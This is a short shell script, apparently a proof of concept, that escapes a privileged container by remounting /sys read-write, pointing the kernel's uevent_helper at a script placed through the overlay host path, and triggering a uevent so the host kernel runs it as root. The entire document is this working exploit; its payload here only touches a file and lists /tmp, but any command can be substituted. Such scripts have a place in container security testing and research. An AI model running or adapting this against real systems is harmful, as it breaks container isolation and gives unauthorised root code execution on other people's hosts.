#!/bin/sh
echo "Changing kernel uevent_helper: "
host_path=`mount | sed -n 's/.*\perdir=\([^,]*\).*/\1/p'`
echo "Host-path: $host_path"
echo '#!/bin/sh' > /cmd
echo "touch /tmp/container-escape-uevent_helper.txt" >> /cmd
echo "ls /tmp > $host_path/output.txt" >> /cmd
chmod a+x /cmd
mount -o remount,rw /sys
echo "$host_path/cmd" > /sys/kernel/uevent_helper
echo "Trying to fire uevent_helper: "
echo change > /sys/class/mem/null/uevent
sleep 5
cat /output.txt
